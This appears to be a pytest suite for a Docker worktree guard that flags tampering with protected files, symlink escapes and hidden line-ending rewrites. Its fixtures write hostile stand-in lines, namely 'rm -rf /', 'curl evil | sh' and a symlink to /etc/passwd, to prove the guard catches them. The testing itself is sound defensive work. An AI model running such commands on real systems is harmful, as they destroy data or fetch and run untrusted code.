"""Tests for claude_workflow.docker_stack (no real docker is ever called)."""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from claude_workflow.config import DEFAULT_PROTECTED_PATHS, DockerConfig
from claude_workflow.docker_stack import (
    base_script_copy,
    compose_env,
    guard_patterns,
    guard_violations,
    prepare_worktree,
    run_command,
    symlink_violations,
    up_command,
)


def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


def _make_repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "wt"
    repo.mkdir()
    _git(repo, "init")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "T")
    (repo / ".gitignore").write_text(".env\nnginx-proxy/certs\nlegacy/docker/cache\n")
    (repo / "test_runner.sh").write_text("echo hi\n")
    (repo / "legacy/docker/legacy-web").mkdir(parents=True)
    (repo / "legacy/docker/legacy-web/legacy-web.Dockerfile").write_text("FROM x\n")
    (repo / "nginx-proxy").mkdir()
    (repo / "nginx-proxy/nginx.conf").write_text("x\n")
    (repo / "legacy/src").mkdir(parents=True)
    (repo / "legacy/src/Foo.php").write_text("<?php\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "base")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    return repo, base


def test_guard_flags_changed_test_runner(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").write_text("rm -rf /\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["test_runner.sh"]


def test_guard_flags_ignored_env_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / ".env").write_text("A=1\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == [".env"]


def test_guard_flags_dockerfile_in_subfolder(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/docker/legacy-web/legacy-web.Dockerfile").write_text("FROM evil\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == [
        "legacy/docker/legacy-web/legacy-web.Dockerfile"
    ]


def test_guard_flags_ignored_directory(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/docker/cache").mkdir()
    (repo / "legacy/docker/cache/x").write_text("x")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["legacy/docker/cache"]


def test_guard_ignores_normal_code(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/src/Foo.php").write_text("<?php // changed\n")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == []


def test_guard_skips_host_copies(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.key").write_text("secret")
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["nginx-proxy/certs"]
    assert (
        guard_violations(
            repo, base, DEFAULT_PROTECTED_PATHS, host_copies=("nginx-proxy/certs",)
        )
        == []
    )


def test_compose_env_uses_main_env_file_not_worktree(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs")
    assert "COMPOSE_ENV_FILES" not in compose_env(cfg, wt, repo)
    assert "--env-file" not in up_command(cfg, wt, repo)
    (repo / ".env").write_text("A=1\n")
    env = compose_env(cfg, wt, repo)
    assert env["COMPOSE_ENV_FILES"] == str(repo / ".env")
    assert env["COMPOSE_PROJECT_NAME"] == "dfs"
    assert env["COMPOSE_FILE"] == str(wt / "docker-compose.yml")
    assert env["COMPOSE_PROFILES"] == "dyflexis"
    cmd = up_command(cfg, wt, repo)
    assert cmd[cmd.index("--env-file") + 1] == str(repo / ".env")
    assert cmd[-5:] == ["up", "-d", "--wait", "--wait-timeout", "900"]
    assert cmd[:2] == ["docker", "compose"]


def test_prepare_worktree_replaces_host_copy_and_creates_dirs(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.crt").write_text("ca")
    (wt / "nginx-proxy/certs").mkdir(parents=True)
    (wt / "nginx-proxy/certs/x").write_text("stale")
    cfg = DockerConfig(
        project_name="dfs", host_copies=("nginx-proxy/certs",), create_dirs=("legacy/cache",)
    )
    prepare_worktree(cfg, wt, repo)
    assert sorted(p.name for p in (wt / "nginx-proxy/certs").iterdir()) == ["ca.crt"]
    assert (wt / "legacy/cache").is_dir()


def test_prepare_worktree_refuses_symlinked_target(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (wt / "nginx-proxy").mkdir(parents=True)
    (wt / "elsewhere").mkdir()
    (wt / "nginx-proxy/certs").symlink_to(wt / "elsewhere")
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    with pytest.raises(ValueError):
        prepare_worktree(cfg, wt, repo)


def test_prepare_worktree_refuses_symlinked_source(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy").mkdir(parents=True)
    (repo / "real").mkdir()
    (repo / "nginx-proxy/certs").symlink_to(repo / "real")
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    with pytest.raises(ValueError):
        prepare_worktree(cfg, wt, repo)


def test_base_script_copy_writes_base_blob_outside_worktree(tmp_path: Path) -> None:
    wt, base = _make_repo(tmp_path)
    (wt / "test_runner.sh").write_text("curl evil | sh\n")
    dest = tmp_path / "out"
    dest.mkdir()

    copy = base_script_copy(wt, base, "test_runner.sh", dest)

    assert copy.parent == dest
    assert copy.read_text() == "echo hi\n"


def test_base_script_copy_missing_in_base_raises(tmp_path: Path) -> None:
    wt, base = _make_repo(tmp_path)

    with pytest.raises(ValueError):
        base_script_copy(wt, base, "nope.sh", tmp_path)


def test_run_command_statuses() -> None:
    ok = MagicMock(returncode=0, stdout="out\n", stderr="err\n")
    with patch("claude_workflow.docker_stack.subprocess.run", return_value=ok) as run:
        assert run_command(["x"], cwd=None, env=None, timeout=5) == ("PASS", "out\nerr")
        assert run.call_args.kwargs["timeout"] == 5
    bad = MagicMock(returncode=2, stdout="", stderr="")
    with patch("claude_workflow.docker_stack.subprocess.run", return_value=bad):
        assert run_command(["x"], cwd=None, env=None, timeout=5)[0] == "FAIL (exit 2)"
    with patch(
        "claude_workflow.docker_stack.subprocess.run",
        side_effect=subprocess.TimeoutExpired("x", 5),
    ):
        assert run_command(["x"], cwd=None, env=None, timeout=5) == (
            "FAIL (timeout after 5s)",
            "",
        )


def test_guard_flags_crlf_rewrite_hidden_by_gitattributes(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / ".gitattributes").write_text("* text eol=lf\n")
    (repo / "test_runner.sh").write_bytes(b"echo hi\r\n")
    # git itself normalises the line endings, so a plain diff sees no change
    plain = subprocess.run(
        ["git", "diff", base, "--name-only"], cwd=repo, capture_output=True, text=True
    ).stdout
    assert "test_runner.sh" not in plain
    flagged = guard_violations(repo, base, DEFAULT_PROTECTED_PATHS)
    assert "test_runner.sh" in flagged
    assert ".gitattributes" in flagged


def test_guard_flags_deleted_protected_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").unlink()
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == ["test_runner.sh"]


def test_guard_flags_symlink_replacing_protected_file(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "test_runner.sh").unlink()
    (repo / "test_runner.sh").symlink_to("legacy/src/Foo.php")
    assert "test_runner.sh" in guard_violations(repo, base, DEFAULT_PROTECTED_PATHS)


def test_guard_clean_when_nothing_changed(
    tmp_path: Path,
) -> None:
    repo, base = _make_repo(tmp_path)
    assert guard_violations(repo, base, DEFAULT_PROTECTED_PATHS) == []


def test_guard_patterns_always_include_host_scripts_and_compose(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "bin").mkdir()
    (repo / "bin/run.sh").write_text("echo\n")
    (repo / "docker-compose.yml").write_text("services: {}\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "more")
    base = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    cfg = DockerConfig(project_name="x", protected_paths=())
    patterns = guard_patterns(cfg, ("bin/run.sh",))
    assert "test_runner.sh" not in patterns  # only what the caller names
    assert "bin/run.sh" in patterns and "docker-compose.yml" in patterns
    assert guard_violations(repo, base, patterns) == []
    (repo / "bin/run.sh").write_text("evil\n")
    (repo / "docker-compose.yml").write_text("evil\n")
    assert guard_violations(repo, base, patterns) == ["bin/run.sh", "docker-compose.yml"]


def test_prepare_worktree_replaces_plain_file_target(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    (repo / "nginx-proxy/certs/ca.crt").write_text("ca")
    (wt / "nginx-proxy").mkdir(parents=True)
    (wt / "nginx-proxy/certs").write_text("a file, not a folder")
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    prepare_worktree(cfg, wt, repo)
    assert (wt / "nginx-proxy/certs/ca.crt").read_text() == "ca"


def test_prepare_worktree_copy_error_is_clear_value_error(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    (repo / "nginx-proxy/certs").mkdir(parents=True)
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", host_copies=("nginx-proxy/certs",))
    error = shutil.Error([("a.key", "b.key", "Permission denied")])
    with (
        patch("claude_workflow.docker_stack.shutil.copytree", side_effect=error),
        pytest.raises(ValueError, match="could not copy nginx-proxy/certs"),
    ):
        prepare_worktree(cfg, wt, repo)


def test_base_script_copy_refuses_symlink_in_base(tmp_path: Path) -> None:
    wt, _ = _make_repo(tmp_path)
    (wt / "link.sh").symlink_to("test_runner.sh")
    _git(wt, "add", ".")
    _git(wt, "commit", "-m", "link")
    dest = tmp_path / "out"
    dest.mkdir()

    with pytest.raises(ValueError, match="regular file"):
        base_script_copy(wt, "HEAD", "link.sh", dest)
    assert list(dest.iterdir()) == []


def test_prepare_worktree_copies_only_included_files(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    certs = repo / "nginx-proxy/certs"
    certs.mkdir(parents=True)
    (certs / "a.crt").write_text("crt")
    (certs / "a.key").write_text("secret")
    (certs / "dhparam.pem").write_text("dh")
    (certs / "link.crt").symlink_to("/etc/passwd")
    wt.mkdir()
    cfg = DockerConfig(
        project_name="dfs",
        host_copies=("nginx-proxy/certs",),
        host_copy_includes=(("nginx-proxy/certs", ("*.crt",)),),
    )

    prepare_worktree(cfg, wt, repo)

    assert sorted(p.name for p in (wt / "nginx-proxy/certs").iterdir()) == ["a.crt"]


def test_up_command_appends_services(tmp_path: Path) -> None:
    repo, wt = tmp_path / "repo", tmp_path / "wt"
    repo.mkdir()
    wt.mkdir()
    cfg = DockerConfig(project_name="dfs", services=("db", "redis"))
    assert up_command(cfg, wt, repo)[-5:] == ["--wait", "--wait-timeout", "900", "db", "redis"]
    assert up_command(cfg, wt, repo)[-2:] == ["db", "redis"]
    assert up_command(DockerConfig(project_name="dfs"), wt, repo)[-1] == "900"


# --- symlinks (a symlinked bind-mount source would make root Docker mount its target) --


def test_symlinks_flag_tracked_dir_replaced_by_symlink(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    shutil.rmtree(repo / "legacy/src")
    (repo / "legacy/src").symlink_to(outside)
    assert symlink_violations(repo, base) == ["legacy/src"]


def test_symlinks_flag_ignored_dir_that_is_a_symlink(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    (repo / "legacy/docker/cache").symlink_to(outside)
    assert symlink_violations(repo, base) == ["legacy/docker/cache"]


def test_symlinks_flag_symlinked_parent_of_a_listed_path(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    outside = tmp_path / "home"
    outside.mkdir()
    (outside / "new.txt").write_text("x")
    (repo / "data").symlink_to(outside)
    # git itself never lists files behind a symlink; the parent check must still hold.
    with (
        patch("claude_workflow.docker_stack.touched_paths", return_value=["data/new.txt"]),
        patch("claude_workflow.docker_stack.ignored_paths", return_value=[]),
    ):
        assert symlink_violations(repo, base) == ["data"]


def test_symlinks_allow_identical_symlink_from_base(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "link").symlink_to("legacy/src")
    _git(repo, "add", "link")
    _git(repo, "commit", "-m", "link")
    base2 = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, check=True, capture_output=True, text=True
    ).stdout.strip()
    with patch(
        "claude_workflow.docker_stack.touched_paths", return_value=["link/Foo.php", "link"]
    ):
        assert symlink_violations(repo, base2) == []
    # Same path, other target: flagged.
    (repo / "link").unlink()
    (repo / "link").symlink_to(tmp_path)
    assert symlink_violations(repo, base2) == ["link"]


def test_symlinks_skip_paths_inside_host_copies(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "nginx-proxy/certs").mkdir()
    (repo / "nginx-proxy/certs/a.crt").symlink_to(tmp_path)
    with patch(
        "claude_workflow.docker_stack.ignored_paths",
        return_value=["nginx-proxy/certs/a.crt"],
    ):
        assert symlink_violations(repo, base) == ["nginx-proxy/certs/a.crt"]
        # The host replaces everything under a host-copies entry before `up`.
        assert symlink_violations(repo, base, host_copies=("nginx-proxy/certs",)) == []
    # The entry itself is still checked.
    shutil.rmtree(repo / "nginx-proxy/certs")
    (repo / "nginx-proxy/certs").symlink_to(tmp_path)
    assert symlink_violations(repo, base, host_copies=("nginx-proxy/certs",)) == [
        "nginx-proxy/certs"
    ]


def test_symlinks_clean_repo(tmp_path: Path) -> None:
    repo, base = _make_repo(tmp_path)
    (repo / "legacy/src/Bar.php").write_text("<?php\n")
    assert symlink_violations(repo, base) == []
